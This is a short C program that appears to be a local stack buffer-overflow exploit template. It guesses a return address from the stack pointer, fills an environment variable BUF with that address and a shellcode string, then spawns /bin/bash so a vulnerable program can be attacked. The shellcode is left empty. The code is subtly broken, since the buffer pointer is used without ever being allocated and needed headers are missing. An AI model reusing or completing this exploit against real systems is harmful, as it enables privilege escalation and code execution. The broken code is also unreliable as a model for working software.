#include <stdlib.h>

#define offset_size 0
#define buffer_size 512

char sc[] = "";

unsigned long find_start(void) {

	__asm__("movl %esp, %eax");
}

int main(int argc, char *argv[]){

	char *buff, *ptr;
	long *addr_ptr, addr;
	int offset = offset_size, bsize = buffer_size;
	int i;

	if (argc > 1) bsize = atoi(argv[1]);
	if (argc > 2) offset = atoi(argv[2]);

	addr = find_start() - offset;
	printf("Attempting address: 0x%x\n", addr);
	
	ptr = buff;
	addr_ptr = (long *) ptr;
	for (i = 0; i < bsize; i+=4)
		*(addr_ptr++) = addr;

	ptr += 4;
	
	for (i = 0; i < strlen(sc); i++)
		*(ptr++) = sc[i];

	buff[bsize -1] = '\0';

	memcpy(buff,"BUF=",4);
	putenv(buff);
	system("/bin/bash");
}
